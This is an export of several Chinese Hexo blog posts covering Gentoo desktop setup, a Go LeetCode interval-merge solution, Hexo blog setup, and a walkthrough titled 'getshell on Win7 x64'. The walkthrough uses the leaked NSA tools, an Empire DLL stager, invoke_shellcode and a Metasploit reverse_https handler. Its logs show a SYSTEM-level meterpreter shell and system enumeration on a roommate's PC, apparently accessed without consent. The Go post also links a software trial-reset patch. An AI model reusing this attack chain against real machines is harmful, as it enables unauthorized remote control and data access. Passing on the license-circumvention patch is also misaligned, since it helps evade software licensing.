<h1 id="装桌面"><a href="#装桌面" class="headerlink" title="装桌面"></a>装桌面</h1><p>先不着急在eselect里面选择，首先利用网络先<code>emerge --sync</code>同步portage树，而后可以选择安装一些需要的软件例如vim等．之前一直卡在这里，解决不了依赖性问题，首先搜索到了xorg的安装方式，参考<a href="https://wiki.gentoo.org/wiki/Xorg/Guide/zh-cn">这里</a>将显卡的驱动安装好，之后便可操作eselect选项，可先做轻便的desktop的选项，而后搜索到xfce4的安装方法，照葫芦画瓢的我便从昨天装到今天中午终于完工了．之后的APP的安装应该都不是什么大问题，装上chrome几乎能够解决很多需求问题．<br><img src="/images/gentoo_desktop.png" alt="gentoo_desktop.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>换个酷炫点的桌面还是继续折腾BLFS…</p>
<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ul>
<li>提示<code>The emerge option --autounmask-write writes autounmask features into the corresponding config files.</code>，重复上次的命令加上参数，然后使用自带的<code>dispatch-conf</code>命令自动写入配置，而后再执行最开始的命令即可解决软件安装版本以及依赖性问题．</li>
</ul>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>GNU/Linux</tag>
        <tag>gentoo</tag>
      </tags>
  </entry>
  <entry>
    <title>getshell on Win7 x64</title>
    <url>/embpgp.github.io/2017/04/27/getshell-on-Win7-x64/</url>
    <content><![CDATA[<blockquote>
<p>凌晨亲自测试NSA Tools，感叹MS08-067时代复现．</p>
</blockquote>
<span id="more"></span>
<hr>
<p>参考链接:<br><a href="https://www.exploit-db.com/docs/41896.pdf">https://www.exploit-db.com/docs/41896.pdf</a><br><a href="https://www.youtube.com/watch?v=OBP_kH6EYmk">https://www.youtube.com/watch?v=OBP_kH6EYmk</a></p>
<hr>
<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>由于近期shadowbroker一直抢占安全头条，随着NSA泄露的工具被解密在github上面，我也想感受一下这些工具的威力，便找了些教程来测试一番．其实完全可以按照第一个链接的PDF文档来搭建环境，文章中说到Win7和Win2K8通过SMB漏洞不需要验证直接可以利用．</p>
<p>target:Win 7 x64 192.168.31.252<br>attacker_1:WinXP 192.168.31.52<br>attacker_2:Ubuntu 16.04 192.168.31.30</p>
<p>没错，我用的就是小米路由器(31网段),ubuntu无线连接并开启XP虚拟机桥接到物理机使其分配到同网段IP，将室友的Win7悄悄地开机并默认连接到路由器即可开始．按照教程还必须安装py2.6和pywin32v2.12在XP攻击机上，ubuntu上安装Empire和MSF用来生成恶意dll和反弹shell．</p>
<h1 id="跑起来"><a href="#跑起来" class="headerlink" title="跑起来"></a>跑起来</h1><p>教程良心，可直接根据提示跑起来，以下为截图或shell echo.</p>
<h2 id="改fb-py"><a href="#改fb-py" class="headerlink" title="改fb.py"></a>改fb.py</h2><p>从github上down源码下来改几处代码即可<br><img src="/images/fb.png" alt="fb.png"></p>
<h2 id="跑Empire"><a href="#跑Empire" class="headerlink" title="跑Empire"></a>跑Empire</h2><p>从github上down源码install.sh即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">====================================================================================</span><br><span class="line"> Empire: PowerShell post-exploitation agent | [Version]: 1.6.0</span><br><span class="line">====================================================================================</span><br><span class="line"> [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3</span><br><span class="line">====================================================================================</span><br><span class="line"></span><br><span class="line">   _______ .___  ___. .______    __  .______       _______</span><br><span class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</span><br><span class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</span><br><span class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</span><br><span class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</span><br><span class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       181 modules currently loaded</span><br><span class="line"></span><br><span class="line">       0 listeners currently active</span><br><span class="line"></span><br><span class="line">       0 agents currently active</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire) &gt; <span class="built_in">set</span> Name Eternal</span><br><span class="line">[!] Please choose <span class="string">&#x27;ip_whitelist&#x27;</span> or <span class="string">&#x27;ip_blacklist&#x27;</span></span><br><span class="line">(Empire) &gt; list</span><br><span class="line">list       listeners  </span><br><span class="line">(Empire) &gt; listeners</span><br><span class="line">[!] No listeners currently active </span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Name Eternal</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Host http://192.168.31.30</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Port 8080</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">[!] Error starting listener on port 8080: [Errno 98] Address already <span class="keyword">in</span> use</span><br><span class="line">[!] Error starting listener on port 8080, port likely already <span class="keyword">in</span> use.</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Port 8000</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">[*] Listener <span class="string">&#x27;Eternal&#x27;</span> successfully started.</span><br><span class="line">(Empire: listeners) &gt; list</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target</span><br><span class="line">  --    ----              ----                                 -------   ------------   --------    ---------------</span><br><span class="line">  1     Eternal           http://192.168.31.30:8000            native    5/0.0                      </span><br><span class="line"></span><br><span class="line">(Empire: listeners) &gt; usestager dll Eternal</span><br><span class="line">(Empire: stager/dll) &gt; <span class="built_in">set</span> Arch x64</span><br><span class="line">(Empire: stager/dll) &gt; execute</span><br><span class="line"></span><br><span class="line">[*] Stager output written out to: /tmp/launcher.dll</span><br><span class="line"></span><br><span class="line">(Empire: stager/dll) &gt; [+] Initial agent RDZ4SYWEFTKBF3FD from 192.168.31.252 now active</span><br><span class="line"></span><br><span class="line">(Empire: stager/dll) &gt; agents</span><br><span class="line"></span><br><span class="line">[*] Active agents:</span><br><span class="line"></span><br><span class="line">  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen</span><br><span class="line">  ---------          -----------     ------------    ---------           -------             -----    --------------------</span><br><span class="line">  RDZ4SYWEFTKBF3FD   192.168.31.252  USER-20170312IA *WorkGroup\SYSTEM   lsass/792           5/0.0    2017-04-27 02:09:35</span><br><span class="line"></span><br><span class="line">(Empire: agents) &gt; sysinfo</span><br><span class="line">*** Unknown syntax: sysinfo</span><br><span class="line">(Empire: agents) &gt; interact RDZ4SYWEFTKBF3FD</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; systeminfo</span><br><span class="line">[!] Command not recognized.</span><br><span class="line">[*] Use <span class="string">&#x27;help&#x27;</span> or <span class="string">&#x27;help agentcmds&#x27;</span> to see available commands.</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; sysinfo</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; </span><br><span class="line">Description      : Qualcomm Atheros AR9485WB-EG Wireless Network Adapter</span><br><span class="line">MACAddress       : XX:XX:XX:XX:XX:XX</span><br><span class="line">DHCPEnabled      : True</span><br><span class="line">IPAddress        : 192.168.31.252,fe80::5d70:a440:294c:b455</span><br><span class="line">IPSubnet         : 255.255.255.0,64</span><br><span class="line">DefaultIPGateway : 192.168.31.1</span><br><span class="line">DNSServer        : 192.168.31.1</span><br><span class="line">DNSHostName      : USER-20170312IA</span><br><span class="line">DNSSuffix        :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; usemodule code_execution/invoke_shellcode</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; <span class="built_in">set</span> Lhost 192.168.31.30</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; <span class="built_in">set</span> Lport 9999</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; execute</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; </span><br><span class="line">Job started: Debug32_gnns4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="跑msf"><a href="#跑msf" class="headerlink" title="跑msf"></a>跑msf</h2><p>跑Kali或者Debian系GNU/Linux都可，安装msf跑起来接收反弹shell，主要用meterpreter．</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; </span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_h</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_hop_http</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http_proxy_pstore</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https_proxy</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.31.30</span><br><span class="line">LHOST =&gt; 192.168.31.30</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 9999</span><br><span class="line">LPORT =&gt; 9999</span><br><span class="line">msf exploit(handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https://192.168.31.30:9999</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] https://192.168.31.30:9999 handling request from 192.168.31.252; (UUID: 7pzlvccd) Staging Native payload...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.31.30:9999 -&gt; 192.168.31.252:49714) at 2017-04-27 02:20:13 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : USER-20170312IA</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64 (Current Process is WOW64)</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WorkGroup</span><br><span class="line">Logged On Users : 1</span><br><span class="line">Meterpreter     : x86/win32</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2432 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           USER-20170312IA</span><br><span class="line">OS ����:          Microsoft Windows 7 �콢�� </span><br><span class="line">OS �汾:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     User</span><br><span class="line">ע������֯:       User</span><br><span class="line">��Ʒ ID:          00426-OEM-8992662-00006</span><br><span class="line">��ʼ��װ����:     2017/3/12, 10:33:43</span><br><span class="line">ϵͳ����ʱ��:     2017/4/27, 1:45:53</span><br><span class="line">ϵͳ������:       Hasee Computer</span><br><span class="line">ϵͳ�ͺ�:         CW65</span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 �������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 58 Stepping 9 GenuineIntel ~1275 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 4.6.5, 2013/5/6</span><br><span class="line">Windows Ŀ¼:     C:\Windows</span><br><span class="line">ϵͳĿ¼:         C:\Windows\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume1</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00)���������죬�����ر�����������³ľ�</span><br><span class="line">�����ڴ�����:     3,991 MB</span><br><span class="line">���õ������ڴ�:   2,494 MB</span><br><span class="line">�����ڴ�: ����ֵ: 7,981 MB</span><br><span class="line">�����ڴ�: ����:   6,291 MB</span><br><span class="line">�����ڴ�: ʹ����: 1,690 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WorkGroup</span><br><span class="line">��¼������:       ��ȱ</span><br><span class="line">�޲�����:         ��װ�� 124 ���޲����</span><br><span class="line">                  [01]: KB2849697</span><br><span class="line">                  [02]: KB2849696</span><br><span class="line">                  [03]: KB2841134</span><br><span class="line">                  [04]: KB2841134</span><br><span class="line">                  [05]: KB2670838</span><br><span class="line">                  [06]: KB2830477</span><br><span class="line">                  [07]: KB2592687</span><br><span class="line">                  [08]: KB917607</span><br><span class="line">                  [09]: KB2909210</span><br><span class="line">                  [10]: KB2929437</span><br><span class="line">                  [11]: KB3000483</span><br><span class="line">                  [12]: KB3004361</span><br><span class="line">                  [13]: KB3004375</span><br><span class="line">                  [14]: KB3019215</span><br><span class="line">                  [15]: KB3020369</span><br><span class="line">                  [16]: KB3020388</span><br><span class="line">                  [17]: KB3021674</span><br><span class="line">                  [18]: KB3022777</span><br><span class="line">                  [19]: KB3023215</span><br><span class="line">                  [20]: KB3030377</span><br><span class="line">                  [21]: KB3031432</span><br><span class="line">                  [22]: KB3032655</span><br><span class="line">                  [23]: KB3033889</span><br><span class="line">                  [24]: KB3033890</span><br><span class="line">                  [25]: KB3033929</span><br><span class="line">                  [26]: KB3035126</span><br><span class="line">                  [27]: KB3035132</span><br><span class="line">                  [28]: KB3037574</span><br><span class="line">                  [29]: KB3042058</span><br><span class="line">                  [30]: KB3042553</span><br><span class="line">                  [31]: KB3045685</span><br><span class="line">                  [32]: KB3046017</span><br><span class="line">                  [33]: KB3046269</span><br><span class="line">                  [34]: KB3055642</span><br><span class="line">                  [35]: KB3059317</span><br><span class="line">                  [36]: KB3060716</span><br><span class="line">                  [37]: KB3061518</span><br><span class="line">                  [38]: KB3067903</span><br><span class="line">                  [39]: KB3069392</span><br><span class="line">                  [40]: KB3069762</span><br><span class="line">                  [41]: KB3071756</span><br><span class="line">                  [42]: KB3072305</span><br><span class="line">                  [43]: KB3072630</span><br><span class="line">                  [44]: KB3072633</span><br><span class="line">                  [45]: KB3074543</span><br><span class="line">                  [46]: KB3075226</span><br><span class="line">                  [47]: KB3076895</span><br><span class="line">                  [48]: KB3076949</span><br><span class="line">                  [49]: KB3078071</span><br><span class="line">                  [50]: KB3078601</span><br><span class="line">                  [51]: KB3080446</span><br><span class="line">                  [52]: KB3081320</span><br><span class="line">                  [53]: KB3084135</span><br><span class="line">                  [54]: KB3086255</span><br><span class="line">                  [55]: KB3087039</span><br><span class="line">                  [56]: KB3092601</span><br><span class="line">                  [57]: KB3093513</span><br><span class="line">                  [58]: KB3097966</span><br><span class="line">                  [59]: KB3097989</span><br><span class="line">                  [60]: KB3099862</span><br><span class="line">                  [61]: KB3100213</span><br><span class="line">                  [62]: KB3101246</span><br><span class="line">                  [63]: KB3101722</span><br><span class="line">                  [64]: KB3101746</span><br><span class="line">                  [65]: KB3108371</span><br><span class="line">                  [66]: KB3108381</span><br><span class="line">                  [67]: KB3108664</span><br><span class="line">                  [68]: KB3108670</span><br><span class="line">                  [69]: KB3109094</span><br><span class="line">                  [70]: KB3109103</span><br><span class="line">                  [71]: KB3109560</span><br><span class="line">                  [72]: KB3110329</span><br><span class="line">                  [73]: KB3112343</span><br><span class="line">                  [74]: KB3115858</span><br><span class="line">                  [75]: KB3121461</span><br><span class="line">                  [76]: KB3122648</span><br><span class="line">                  [77]: KB3123479</span><br><span class="line">                  [78]: KB3124280</span><br><span class="line">                  [79]: KB3126446</span><br><span class="line">                  [80]: KB3126587</span><br><span class="line">                  [81]: KB3127220</span><br><span class="line">                  [82]: KB3135983</span><br><span class="line">                  [83]: KB3138612</span><br><span class="line">                  [84]: KB3138910</span><br><span class="line">                  [85]: KB3138962</span><br><span class="line">                  [86]: KB3139398</span><br><span class="line">                  [87]: KB3139914</span><br><span class="line">                  [88]: KB3139940</span><br><span class="line">                  [89]: KB3140735</span><br><span class="line">                  [90]: KB3142024</span><br><span class="line">                  [91]: KB3142042</span><br><span class="line">                  [92]: KB3145739</span><br><span class="line">                  [93]: KB3146706</span><br><span class="line">                  [94]: KB3146963</span><br><span class="line">                  [95]: KB3149090</span><br><span class="line">                  [96]: KB3153171</span><br><span class="line">                  [97]: KB3153199</span><br><span class="line">                  [98]: KB3153731</span><br><span class="line">                  [99]: KB3155178</span><br><span class="line">                  [100]: KB3156013</span><br><span class="line">                  [101]: KB3156016</span><br><span class="line">                  [102]: KB3156017</span><br><span class="line">                  [103]: KB3156019</span><br><span class="line">                  [104]: KB3159398</span><br><span class="line">                  [105]: KB3161561</span><br><span class="line">                  [106]: KB3161949</span><br><span class="line">                  [107]: KB3161958</span><br><span class="line">                  [108]: KB3163245</span><br><span class="line">                  [109]: KB3164033</span><br><span class="line">                  [110]: KB3164035</span><br><span class="line">                  [111]: KB3170455</span><br><span class="line">                  [112]: KB3177186</span><br><span class="line">                  [113]: KB3178034</span><br><span class="line">                  [114]: KB3184122</span><br><span class="line">                  [115]: KB3185911</span><br><span class="line">                  [116]: KB3188730</span><br><span class="line">                  [117]: KB3192391</span><br><span class="line">                  [118]: KB3205394</span><br><span class="line">                  [119]: KB3210131</span><br><span class="line">                  [120]: KB3212642</span><br><span class="line">                  [121]: KB4012204</span><br><span class="line">                  [122]: KB4014565</span><br><span class="line">                  [123]: KB4014661</span><br><span class="line">                  [124]: KB4015546</span><br><span class="line">����:             ��װ�� 4 �� NIC��</span><br><span class="line">                  [01]: Qualcomm Atheros AR9485WB-EG Wireless Network Adapter</span><br><span class="line">                      ������:      �����������</span><br><span class="line">                      ���� DHCP:   �</span><br><span class="line">                      DHCP ������: 192.168.31.1</span><br><span class="line">                      IP ��ַ</span><br><span class="line">                        [01]: 192.168.31.252</span><br><span class="line">                        [02]: fe80::5d70:a440:294c:b455</span><br><span class="line">                  [02]: Realtek PCIe GBE Family Controller</span><br><span class="line">                      ������:      �������</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line">                  [03]: Microsoft Virtual WiFi Miniport Adapter</span><br><span class="line">                      ������:      ������������ 2</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line">                  [04]: VPN Client Adapter - VPN</span><br><span class="line">                      ������:      VPN - VPN Client</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">\\ ���û��ʻ�</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    </span><br><span class="line">�����������ϣ�������һ�����������</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>建议尽快升级系统或者关闭相关服务来缓解NSA工具集带来的冲击,BTW，我主要用的PC是GNU/Linux并不用Windows．</p>
]]></content>
      <categories>
        <category>study</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>shellcode</tag>
        <tag>NSA</tag>
        <tag>msf</tag>
        <tag>shadowbroker</tag>
      </tags>
  </entry>
  <entry>
    <title>golang init</title>
    <url>/embpgp.github.io/2021/07/20/golang-init/</url>
    <content><![CDATA[<blockquote>
<p>拥抱追求高效率生产的云原生时代</p>
</blockquote>
<span id="more"></span>
<hr>
<p><strong>参考资料</strong> </p>
<ul>
<li><a href="https://github.com/unknwon/the-way-to-go_ZH_CN/blob/master/eBook/directory.md" title="go在线教程">go在线教程</a>  </li>
<li><a href="https://leetcode-cn.com/problems/merge-intervals/solution/go-er-wei-slicepai-xu-by-todayweather/" title="leetcode">leetcode区间合并</a></li>
</ul>
<hr>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>此处可以直接搜索网上的教程，建议用goland+插件，可以极大地提高生产效率，试用补丁方案在<a href="https://zhile.io/2020/11/18/jetbrains-eval-reset-da33a93d.html" title="补丁">这里</a>参考。</p>
<h1 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h1><blockquote>
<p>采用leetcode刷题学习，题目是要求合并若干区间数组</p>
</blockquote>
<p>以数组 intervals 表示若干个区间的集合，其中单个区间为 intervals[i] = [starti, endi] 。请你合并所有重叠的区间，并返回一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间。</p>
<p>这道题在现实情况的工程问题可能对应着需要找出用户配置的IP端，可以合并下发到数据面。</p>
<h1 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h1><blockquote>
<p>所以解算法题最先要想到如果达到了目标状态，那些数据应该是什么样的</p>
</blockquote>
<p>我们用数组 merged 存储最终的答案。<br>首先，我们将列表中的区间按照左端点升序排序。然后我们将第一个区间加入 merged 数组中，并按顺序依次考虑之后的每个区间：<br>如果当前区间的左端点在数组 merged 中最后一个区间的右端点之后，那么它们不会重合，我们可以直接将这个区间加入数组 merged 的末尾；<br>否则，它们重合，我们需要用当前区间的右端点更新数组 merged 中最后一个区间的右端点，将其置为二者的较大值。<br>左端点不需要设置，因为已经排序好了。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Element [][]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Element)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span> &#123; p[i], p[j] = p[j], p[i] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Element)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span>      &#123; <span class="keyword">return</span> <span class="built_in">len</span>(p) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断i位置的元素是否比j位置的元素小，如果为真，sort方法会调用swap函数交换</span></span><br><span class="line"><span class="comment">//但是sort函数本身实现是根据从后往前判断的，因此还是默认为升序</span></span><br><span class="line"><span class="comment">//参考sort.sort函数实现的源码</span></span><br><span class="line"><span class="comment">//https://golang.org/src/sort/sort.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Element)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p[i][<span class="number">0</span>] &lt; p[j][<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">leetcode来源：</span></span><br><span class="line"><span class="comment">思路</span></span><br><span class="line"><span class="comment">按照最终的排序状态，肯定是连续的集合</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">merge</span><span class="params">(intervals [][]<span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	ret := <span class="built_in">make</span>([][]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">	sort.Sort(Element(intervals))</span><br><span class="line">	retIndex := <span class="number">0</span></span><br><span class="line">	ret = <span class="built_in">append</span>(ret, intervals[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(intervals); i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> ret[retIndex][<span class="number">1</span>] &lt; intervals[i][<span class="number">0</span>] &#123; <span class="comment">// 当前扫描区间和前一区间不重合，则直接添加到结果中</span></span><br><span class="line">			ret = <span class="built_in">append</span>(ret, intervals[i])</span><br><span class="line">			retIndex++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; <span class="comment">// 相邻两个区间重合，则合并成一个区间</span></span><br><span class="line">			<span class="comment">//ret[retIndex][0] = min(ret[retIndex][0], intervals[i][0]) //左值已经排序好了</span></span><br><span class="line">			ret[retIndex][<span class="number">1</span>] = max(ret[retIndex][<span class="number">1</span>], intervals[i][<span class="number">1</span>])</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	array := [][]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">3</span>&#125;, &#123;<span class="number">2</span>, <span class="number">6</span>&#125;, &#123;<span class="number">8</span>, <span class="number">10</span>&#125;, &#123;<span class="number">15</span>, <span class="number">18</span>&#125;&#125;</span><br><span class="line">	out := merge(array)</span><br><span class="line">	fmt.Println((out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>轮子好啊</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello world</title>
    <url>/embpgp.github.io/2016/08/16/hello-world/</url>
    <content><![CDATA[<h1 id="Hexo-and-NexT-on-Github-建博客折腾…"><a href="#Hexo-and-NexT-on-Github-建博客折腾…" class="headerlink" title="Hexo and NexT on Github 建博客折腾…"></a>Hexo and NexT on Github 建博客折腾…</h1><hr>
<blockquote>
<p>本来已经搭建好了,后来在知乎上看到了自己以前想解决的问题—&gt;如何保证仓库所有的都同步.因为hexo只会生成网页所需要的部分,并不会将本地仓库所有内容都上传至github,由此再次折腾….为了在Windows上搭建环境看是否能够同步,由此再再次验证…</p>
</blockquote>
<span id="more"></span>
<p><strong>参考资料</strong>  </p>
<ul>
<li><a href="https://hexo.io/zh-cn/docs/" title="Hexo官网">Hexo.io原装教程:https://hexo.io/zh-cn/docs/</a>  </li>
<li><a href="http://theme-next.iissnan.com/theme-settings.html" title="Next主题">Next主题配置:http://theme-next.iissnan.com/theme-settings.html</a>  </li>
<li><a href="http://ibruce.info/2013/11/22/hexo-your-blog/" title="不如的博客">不如的教程:http://ibruce.info/2013/11/22/hexo-your-blog/</a>  </li>
<li><a href="http://bubkoo.com/2013/12/16/hexo-issure/" title="tags..">bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/</a>  </li>
<li><a href="http://www.cnblogs.com/debugzer0/articles/5461804.html" title="add tags">新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html</a>  </li>
<li><a href="http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" title="two repository">双份仓库解决</a>  </li>
<li><a href="http://www.wuliaole.com/post/the_error_met_during_the_installation_of_hexo/#Hexo-g%E7%9A%84%E6%97%B6%E5%80%99%E9%81%87%E5%88%B0Warn-No-layout" title="port busy">端口占用问题</a>  </li>
<li><a href="https://github.com/iissnan/hexo-theme-next/issues/328">主题配置文件同步:https://github.com/iissnan/hexo-theme-next/issues/328</a>  </li>
</ul>
<hr>
<h1 id="装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装"><a href="#装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装" class="headerlink" title="装环境(详情参考官网教程,此处简述，至少github环境安装从略_Windows的有点坑,可以直接去nodejs官网下载msi安装)"></a>装环境(详情参考官网教程,此处简述，至少github环境安装从略<del>_</del>Windows的有点坑,可以直接去nodejs官网下载msi安装)</h1><p><strong>安装Node.js</strong><br>    Wget:<br>    <code>$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code><br>    安装完成后，重启终端并执行一下命令：<br>    <code>$ nvm install stable</code><br><strong>安装Hexo</strong><br>    <code>$ npm install hexo-cli -g　　#装hexo</code><br><strong>初始化项目并开启服务</strong>(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)</p>
<pre><code class="bash">    $ hexo init username.github.io　#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  
